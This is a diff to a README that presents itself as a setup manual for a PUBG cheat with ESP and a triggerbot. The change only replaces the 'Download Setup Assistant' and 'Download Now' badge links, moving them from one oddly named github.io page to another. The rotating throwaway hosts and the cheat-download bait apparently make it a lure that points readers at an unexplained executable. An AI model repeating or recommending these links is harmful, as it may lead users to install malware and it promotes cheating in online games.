@@ -1,7 +1,7 @@
 # 🟡 PUBG ESP + Triggerbot — Setup Manual
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-brightgreen?style=for-the-badge)](https://pubgtrigerb01web9.github.io/.github/)
-[![Download Now](https://img.shields.io/badge/Download_Now-green?style=for-the-badge&logo=pubg)](https://pubgtrigerb01web9.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-brightgreen?style=for-the-badge)](https://pubgqesptrigg3rb0tinfo0.github.io/.github/)
+[![Download Now](https://img.shields.io/badge/Download_Now-green?style=for-the-badge&logo=pubg)](https://pubgqesptrigg3rb0tinfo0.github.io/.github/)
 
 ---
 
